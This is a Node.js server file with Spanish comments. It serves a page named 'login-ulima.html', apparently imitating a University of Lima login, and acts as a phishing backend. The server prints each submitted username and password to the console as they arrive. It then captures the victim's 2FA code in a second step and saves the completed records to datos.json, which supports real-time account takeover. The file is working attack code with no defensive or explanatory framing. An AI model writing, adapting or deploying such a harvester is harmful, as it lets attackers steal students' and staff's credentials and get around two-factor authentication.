// Servidor mínimo con Node (sin dependencias). Arranca con: node server.js
// Sirve login-ulima.html y guarda los envíos en datos.json
const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = 3000;
const HTML = path.join(__dirname, 'login-ulima.html');
const DB = path.join(__dirname, 'datos.json');

const server = http.createServer((req, res) => {
  // Guardar datos: POST /guardar
  if (req.method === 'POST' && req.url === '/guardar') {
    let body = '';
    req.on('data', chunk => { body += chunk; });
    req.on('end', () => {
      let registro;
      try {
        registro = JSON.parse(body || '{}');
      } catch (e) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ ok: false, error: 'JSON inválido' }));
      }
      registro.recibidoEn = new Date().toISOString();
      const tiene2fa = !!registro.codigoVerificacion;

      // Imprimir en tiempo real según el paso
      if (tiene2fa) {
        console.log('\n----- Paso 2: código 2FA -----');
        console.log('Usuario:    ' + (registro.usuario || '-'));
        console.log('Código 2FA: ' + registro.codigoVerificacion);
        console.log('------------------------------');
      } else {
        console.log('\n----- Paso 1: credenciales -----');
        console.log('Usuario:    ' + (registro.usuario || '-'));
        console.log('Contraseña: ' + (registro.contrasena || '-'));
        console.log('--------------------------------');
      }

      // Guardar en datos.json solo cuando el registro está completo (con 2FA)
      if (!tiene2fa) {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ ok: true, step: 'credenciales' }));
      }

      let lista = [];
      try { lista = JSON.parse(fs.readFileSync(DB, 'utf8')); } catch (e) { lista = []; }
      if (!Array.isArray(lista)) lista = [];
      lista.push(registro);

      fs.writeFile(DB, JSON.stringify(lista, null, 2), err => {
        if (err) {
          res.writeHead(500, { 'Content-Type': 'application/json' });
          return res.end(JSON.stringify({ ok: false, error: 'No se pudo guardar' }));
        }
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ ok: true, step: '2fa', total: lista.length }));
        console.log('  -> guardado en datos.json (registro #' + lista.length + ')\n');
      });
    });
    return;
  }

  // Página principal
  if (req.method === 'GET' && (req.url === '/' || req.url === '/index.html' || req.url === '/login-ulima.html')) {
    fs.readFile(HTML, (err, data) => {
      if (err) { res.writeHead(500); return res.end('No se encontró login-ulima.html'); }
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      res.end(data);
    });
    return;
  }

  res.writeHead(404);
  res.end('No encontrado');
});

server.listen(PORT, () => {
  console.log('Servidor en http://localhost:' + PORT);
  console.log('Los datos se guardan en: ' + DB);
});
